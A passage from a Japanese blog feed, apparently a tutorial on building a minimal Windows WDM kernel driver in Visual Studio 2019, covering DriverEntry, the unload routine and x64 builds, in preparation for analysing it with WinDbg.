&lt;p&gt;次はRC4とかROT13あたりの暗号化処理を実装してデバッグしてみたいと思います。&lt;/p&gt;</content:encoded></item><item><title><![CDATA[Windowsカーネルドライバを自作してWinDbgで解析してみる]]></title><link>https://kashiwaba-yuki.com/windows-windriver-001-tutorial</link><guid isPermaLink="false">https://kashiwaba-yuki.com/windows-windriver-001-tutorial</guid><pubDate>Wed, 22 Dec 2021 00:00:00 GMT</pubDate><content:encoded>&lt;p&gt;Windowsのカーネルデバッグを試す上で壁になったのが、詳細な仕様が公開されているカーネルドライバが少ないという壁にぶつかりました。&lt;/p&gt;
&lt;p&gt;なければ作ってしまおう、と思いカーネルドライバの開発を始めました。&lt;/p&gt;
&lt;p&gt;カーネルドライバの開発にあたっては、基本的に以下の書籍を参考にしつつ進めてます。&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://amzn.to/3H3WMoe&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;Windowsカーネルドライバプログラミング&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;カーネルデバッグの設定方法については以下の記事でまとめてあります。&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;/windows-windbg-004-kernel-debug&quot;&gt;WinDbgでWindows10環境のカーネルデバッグを行う最初の一歩&lt;/a&gt;&lt;/p&gt;
&lt;!-- omit in toc --&gt;
&lt;h2 id=&quot;もくじ&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E3%82%82%E3%81%8F%E3%81%98&quot; aria-label=&quot;もくじ permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;もくじ&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;a href=&quot;#%E6%9C%80%E5%88%9D%E3%81%AE%E3%83%89%E3%83%A9%E3%82%A4%E3%83%90%E3%82%92%E4%BD%9C%E3%82%8B&quot;&gt;最初のドライバを作る&lt;/a&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#wdm%E3%81%A8%E3%81%AF&quot;&gt;WDMとは&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#%E3%82%B7%E3%83%B3%E3%83%97%E3%83%AB%E3%81%AA%E3%82%B3%E3%83%BC%E3%83%89&quot;&gt;シンプルなコード&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#driverentry&quot;&gt;DriverEntry&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#firstdriverunload&quot;&gt;FirstDriverUnload&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#%E3%82%B7%E3%82%B9%E3%83%86%E3%83%A0%E3%82%B9%E3%83%AC%E3%83%83%E3%83%89%E3%82%AB%E3%83%BC%E3%83%8D%E3%83%AB%E3%83%A2%E3%83%BC%E3%83%89%E3%82%B7%E3%82%B9%E3%83%86%E3%83%A0%E3%82%B9%E3%83%AC%E3%83%83%E3%83%89&quot;&gt;システムスレッド（カーネルモードシステムスレッド）&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#%E3%83%89%E3%83%A9%E3%82%A4%E3%83%90%E3%82%92%E3%83%93%E3%83%AB%E3%83%89%E3%81%99%E3%82%8B&quot;&gt;ドライバをビルドする&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#%E5%AF%BE%E8%B1%A1%E3%83%97%E3%83%A9%E3%83%83%E3%83%88%E3%83%95%E3%82%A9%E3%83%BC%E3%83%A0%E3%81%AE%E8%A8%AD%E5%AE%9A&quot;&gt;対象プラットフォームの設定&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#%E3%82%AB%E3%83%BC%E3%83%8D%E3%83%AB%E3%83%89%E3%83%A9%E3%82%A4%E3%83%90%E3%82%92%E3%83%AD%E3%83%BC%E3%83%89%E3%81%99%E3%82%8B&quot;&gt;カーネルドライバをロードする&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#%E3%82%B5%E3%83%BC%E3%83%93%E3%82%B9%E3%81%AE%E5%81%9C%E6%AD%A2%E3%81%8C%E3%81%A7%E3%81%8D%E3%81%AA%E3%81%84%E5%95%8F%E9%A1%8C&quot;&gt;サービスの停止ができない問題&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#%E3%82%B5%E3%83%BC%E3%83%93%E3%82%B9%E3%82%92%E5%86%8D%E8%AA%AD%E3%81%BF%E8%BE%BC%E3%81%BF%E3%81%99%E3%82%8B&quot;&gt;サービスを再読み込みする&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#%E3%82%B5%E3%83%BC%E3%83%93%E3%82%B9%E3%81%AE%E7%A2%BA%E8%AA%8D&quot;&gt;サービスの確認&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#%E3%83%89%E3%83%A9%E3%82%A4%E3%83%90%E3%81%8C%E3%82%B7%E3%82%B9%E3%83%86%E3%83%A0%E3%81%AB%E8%AA%AD%E3%81%BF%E8%BE%BC%E3%81%BE%E3%82%8C%E3%81%A6%E3%81%84%E3%82%8B%E3%81%93%E3%81%A8%E3%82%92%E7%A2%BA%E8%AA%8D&quot;&gt;ドライバがシステムに読み込まれていることを確認&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#kdprint%E3%83%9E%E3%82%AF%E3%83%AD%E3%82%92%E8%BF%BD%E5%8A%A0%E3%81%99%E3%82%8B&quot;&gt;KdPrintマクロを追加する&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#debugview%E3%82%92%E8%A8%AD%E5%AE%9A%E3%81%99%E3%82%8B&quot;&gt;DebugViewを設定する&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#%E3%82%AB%E3%83%BC%E3%83%8D%E3%83%AB%E3%83%87%E3%83%90%E3%83%83%E3%82%B0%E3%81%A7%E8%87%AA%E4%BD%9C%E3%83%89%E3%83%A9%E3%82%A4%E3%83%90%E3%82%92%E8%A7%A3%E6%9E%90%E3%81%97%E3%81%A6%E3%81%BF%E3%82%8B&quot;&gt;カーネルデバッグで自作ドライバを解析してみる&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#%E3%81%BE%E3%81%A8%E3%82%81&quot;&gt;まとめ&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&quot;最初のドライバを作る&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E6%9C%80%E5%88%9D%E3%81%AE%E3%83%89%E3%83%A9%E3%82%A4%E3%83%90%E3%82%92%E4%BD%9C%E3%82%8B&quot; aria-label=&quot;最初のドライバを作る permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;最初のドライバを作る&lt;/h2&gt;
&lt;p&gt;とりあえず最初のドライバを作っていきます。&lt;/p&gt;
&lt;p&gt;VisualStudioからWDMプロジェクトを作成します。&lt;/p&gt;
&lt;p&gt;この時、本記事を執筆した2021/12/01時点では、VisualStudio 2022はカーネルドライバの開発に非対応でした。&lt;/p&gt;
&lt;p&gt;そのため、VisualStudio 2022以降にアップデートしていると、WDMプロジェクトを作成することができませんので注意が必要です。&lt;/p&gt;
&lt;p&gt;今回はVisualStudio 2019を使用しています。&lt;/p&gt;
&lt;h3 id=&quot;wdmとは&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#wdm%E3%81%A8%E3%81%AF&quot; aria-label=&quot;wdmとは permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;WDMとは&lt;/h3&gt;
&lt;p&gt;WDMは&lt;code class=&quot;language-text&quot;&gt;Microsoft Windows Driver Model&lt;/code&gt;の略称で、Windows 2000以降のデバイスドライバーのアーキテクチャです。&lt;/p&gt;
&lt;p&gt;現在では非推奨のドライバモデルです。&lt;/p&gt;
&lt;p&gt;現在カーネルドライバを作成する場合は、&lt;code class=&quot;language-text&quot;&gt;Windows Driver Foundation(WDF)&lt;/code&gt;かユニバーサルWindowsドライバが主流になっているのかな？&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://docs.microsoft.com/ja-jp/windows-hardware/drivers/kernel/introduction-to-wdm&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;WDM の概要 - Windows drivers | Microsoft Docs&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;WDMドライバには、以下の3つの種類があります。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;bus driver&lt;/li&gt;
&lt;li&gt;function driver&lt;/li&gt;
&lt;li&gt;filter drivers&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://docs.microsoft.com/en-us/windows-hardware/drivers/kernel/bus-drivers&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;Bus Drivers - Windows drivers | Microsoft Docs&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://docs.microsoft.com/en-us/windows-hardware/drivers/kernel/function-drivers&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;Function Drivers - Windows drivers | Microsoft Docs&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://docs.microsoft.com/en-us/windows-hardware/drivers/kernel/filter-drivers&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;Filter Drivers - Windows drivers | Microsoft Docs&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&quot;シンプルなコード&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E3%82%B7%E3%83%B3%E3%83%97%E3%83%AB%E3%81%AA%E3%82%B3%E3%83%BC%E3%83%89&quot; aria-label=&quot;シンプルなコード permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;シンプルなコード&lt;/h3&gt;
&lt;p&gt;VisualStudioでWDMプロジェクトを作成したら、適当な名前のC++ソースファイルを追加して以下のコードを追加します。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;c++&quot;&gt;&lt;pre class=&quot;language-c++&quot;&gt;&lt;code class=&quot;language-c++&quot;&gt;#include &amp;lt;ntddk.h&amp;gt;

void FirstDriverUnload(_In_ PDRIVER_OBJECT DriverObject)
{
	UNREFERENCED_PARAMETER(DriverObject);
}

extern &amp;quot;C&amp;quot;
NTSTATUS
DriverEntry(_In_ PDRIVER_OBJECT DriverObject, _In_ PUNICODE_STRING RegistryPath)
{
	UNREFERENCED_PARAMETER(DriverObject);
	UNREFERENCED_PARAMETER(RegistryPath);

	return STATUS_SUCCESS;
}&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;h3 id=&quot;driverentry&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#driverentry&quot; aria-label=&quot;driverentry permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;DriverEntry&lt;/h3&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;DriverEntry&lt;/code&gt;は、ドライバモジュールのエントリポイントになります。&lt;/p&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;DriverEntry&lt;/code&gt;は、システムスレッド（カーネルモードシステムスレッド）から&lt;code class=&quot;language-text&quot;&gt;IRQL_PASSIVE_LEVEL(0)&lt;/code&gt;のIRQLで呼び出されます。&lt;/p&gt;
&lt;h3 id=&quot;firstdriverunload&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#firstdriverunload&quot; aria-label=&quot;firstdriverunload permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;FirstDriverUnload&lt;/h3&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;FirstDriverUnload&lt;/code&gt;は、ドライバのアンロードルーチンを定義します。&lt;/p&gt;
&lt;p&gt;関数名は&lt;code class=&quot;language-text&quot;&gt;FirstDriverUnload&lt;/code&gt;以外に変更しても問題ありません。&lt;/p&gt;
&lt;p&gt;上記のサンプルコードではまだ定義されていませんが、&lt;code class=&quot;language-text&quot;&gt;DriverObject&lt;/code&gt;の&lt;code class=&quot;language-text&quot;&gt;DriverUnload&lt;/code&gt;に指定することでドライバモジュールのアンロード時に呼び出す関数を定義します。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;c++&quot;&gt;&lt;pre class=&quot;language-c++&quot;&gt;&lt;code class=&quot;language-c++&quot;&gt;// アンロードルーチンを定義
DriverObject-&amp;gt;DriverUnload = FirstDriverUnload;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;カーネルドライバの場合はアンロードされるタイミングでメモリリソースなどの解放が必要となるため、このアンロードルーチンでクリーンアップの処理を定義します。&lt;/p&gt;
&lt;h3 id=&quot;システムスレッドカーネルモードシステムスレッド&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E3%82%B7%E3%82%B9%E3%83%86%E3%83%A0%E3%82%B9%E3%83%AC%E3%83%83%E3%83%89%E3%82%AB%E3%83%BC%E3%83%8D%E3%83%AB%E3%83%A2%E3%83%BC%E3%83%89%E3%82%B7%E3%82%B9%E3%83%86%E3%83%A0%E3%82%B9%E3%83%AC%E3%83%83%E3%83%89&quot; aria-label=&quot;システムスレッドカーネルモードシステムスレッド permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;システムスレッド（カーネルモードシステムスレッド）&lt;/h3&gt;
&lt;p&gt;システムプロセス(プロセスID 4)が実行しているスレッドがシステムスレッドであり、カーネルモードで実行されています。&lt;/p&gt;
&lt;p&gt;システムスレッドは、&lt;code class=&quot;language-text&quot;&gt;Ntoskrnl.exe&lt;/code&gt;か、ロードされているデバイスドライバのカーネルモードコードを実行します。&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://amzn.to/3ei56Eg&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;インサイドWindows 第7版 上&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&quot;ドライバをビルドする&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E3%83%89%E3%83%A9%E3%82%A4%E3%83%90%E3%82%92%E3%83%93%E3%83%AB%E3%83%89%E3%81%99%E3%82%8B&quot; aria-label=&quot;ドライバをビルドする permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;ドライバをビルドする&lt;/h3&gt;
&lt;p&gt;最低限のコードが作成できたらカーネルドライバをビルドします。&lt;/p&gt;
&lt;p&gt;とりあえずデバッグビルドで作成するので、[Ctrl+Shift+B]を押してビルドします。&lt;/p&gt;
&lt;h3 id=&quot;対象プラットフォームの設定&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E5%AF%BE%E8%B1%A1%E3%83%97%E3%83%A9%E3%83%83%E3%83%88%E3%83%95%E3%82%A9%E3%83%BC%E3%83%A0%E3%81%AE%E8%A8%AD%E5%AE%9A&quot; aria-label=&quot;対象プラットフォームの設定 permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;対象プラットフォームの設定&lt;/h3&gt;
&lt;p&gt;今回はx64環境向けのドライバモジュールをビルドするので、VisualStudioのプロジェクトのプロパティから、[アクティブソリューションプラットフォーム]の設定を[x64]にしておきます。&lt;/p&gt;
&lt;p&gt;&lt;span
      class=&quot;gatsby-resp-image-wrapper&quot;
      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 944px; &quot;
    &gt;
      &lt;a
    class=&quot;gatsby-resp-image-link&quot;
    href=&quot;/static/e5202bb713f0239c106e61aa9276e9d5/966a0/image-58.png&quot;
    style=&quot;display: block&quot;
    target=&quot;_blank&quot;
    rel=&quot;noopener&quot;
  &gt;
    &lt;span
    class=&quot;gatsby-resp-image-background-image&quot;
    style=&quot;padding-bottom: 75.41666666666667%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAPCAYAAADkmO9VAAAACXBIWXMAAAsTAAALEwEAmpwYAAACu0lEQVQ4y41TS08TURSeH0DCig1pEDCgCa8N/gckboj/g3/QhQsXmCBuCW4AY4GakCBqQmq7wIUYQyAQGzt9t9PpPDswnU6ffJ5zSxF1gTf55t5z7z3f+c45d6Sjo68wDB2ZTAalUgmapkHX9S5orWllFItFcVYul6+hIpfLwbYs7O3tIRAIYGhoSEA6PPyCRCKJH/GfKCoqlJKKhJxCLl+EbljQdBPZXAH5AtsmDNOiYCYy2TzsioP9/Q9/Eh59+w45mSEyDWXNIgcHqXSOnG20r4BWB3A9n85L8Go+rmivQ2jzh0Y0GsXg4OBvwtPTU1gk3TRNeF4VFeeS0skLu9lsCifHcaAoCkxS6DgX6HQ6aLXb4iwWiwmikZERDA8PQzo5OYGqqqJOruvi4tKFnJCRTKZQI0U8DN3A+fk54vG4qCWTtVotcXZwcIC+vj709/djYGCgS6gQWbGowPd9UmYhm82iQvVhhfV6XQSybRuXFKy3x3fbRJxOp7G6uoqNjQ0sLi5eE1I6CVJlWbZQyx0vFAqQZVnYvZIYhoF8Pn8DDsyvwa/VhNpwONytIW/26laiLnNqqVRGOMly8tpOdUGKVLUsyFV6QjqVI0PErlvF+vo6KSRCll6jKAyNyPmtsVpOrd3uiCC8V6lUUKJuswAuAZeCfbhRPLa2tiEdHx+LzW6NuMNZkSJ3lgkYvO7Zf695Zl9u0ubmG0hnZ2eoVquCxPM8kTZDXL7lfJvg9ppn9u0SbkIKBoNYWXmF5eWXWFp6gbW11/843wUm5O6HQiFIY2MPMTo6Bp4DgXuYn39ykwZf5PkuWJRRq9lAeGcH0uTkNKamZjAxMUXE97Gw8BSNRlO8s/9Bve7DvnDhNq4Q2n4HaXb2ERjT0zMYH3+AubnH4neKRCKEz3cgglj0M3bff8Lb3Y8IPnuOX6ZgBqT8x/wCAAAAAElFTkSuQmCC&apos;); background-size: cover; display: block;&quot;
  &gt;&lt;/span&gt;
  &lt;picture&gt;
          &lt;source
              srcset=&quot;/static/e5202bb713f0239c106e61aa9276e9d5/8ac56/image-58.webp 240w,
/static/e5202bb713f0239c106e61aa9276e9d5/d3be9/image-58.webp 480w,
/static/e5202bb713f0239c106e61aa9276e9d5/59b61/image-58.webp 944w&quot;
              sizes=&quot;(max-width: 944px) 100vw, 944px&quot;
              type=&quot;image/webp&quot;
            /&gt;
          &lt;source
            srcset=&quot;/static/e5202bb713f0239c106e61aa9276e9d5/8ff5a/image-58.png 240w,
/static/e5202bb713f0239c106e61aa9276e9d5/e85cb/image-58.png 480w,
/static/e5202bb713f0239c106e61aa9276e9d5/966a0/image-58.png 944w&quot;
            sizes=&quot;(max-width: 944px) 100vw, 944px&quot;
            type=&quot;image/png&quot;
          /&gt;
          &lt;img
            class=&quot;gatsby-resp-image-image&quot;
            src=&quot;/static/e5202bb713f0239c106e61aa9276e9d5/966a0/image-58.png&quot;
            alt=&quot;image-58.png&quot;
            title=&quot;image-58.png&quot;
            loading=&quot;lazy&quot;
            style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
          /&gt;
        &lt;/picture&gt;
  &lt;/a&gt;
    &lt;/span&gt;&lt;/p&gt;
&lt;p&gt;ここがデフォルトの設定のままだとx86環境向けのドライバモジュールがビルドされるので、64bit Windowsで起動しようとしても失敗する問題が発生します。&lt;/p&gt;
&lt;h3 id=&quot;カーネルドライバをロードする&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E3%82%AB%E3%83%BC%E3%83%8D%E3%83%AB%E3%83%89%E3%83%A9%E3%82%A4%E3%83%90%E3%82%92%E3%83%AD%E3%83%BC%E3%83%89%E3%81%99%E3%82%8B&quot; aria-label=&quot;カーネルドライバをロードする permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;カーネルドライバをロードする&lt;/h3&gt;
&lt;p&gt;ドライバのビルドができたら、ビルドしたドライバモジュールを仮想マシンの&lt;code class=&quot;language-text&quot;&gt;Z:\FirstDriverSample.sys&lt;/code&gt;として配置します。&lt;/p&gt;
&lt;p&gt;※ここは任意のフォルダ、ドライバ名でOKです。&lt;/p&gt;
&lt;p&gt;次に&lt;code class=&quot;language-text&quot;&gt;sc&lt;/code&gt;コマンドで、作成したドライバを&lt;code class=&quot;language-text&quot;&gt;001_sample&lt;/code&gt;サービスとしてロードします。&lt;/p&gt;
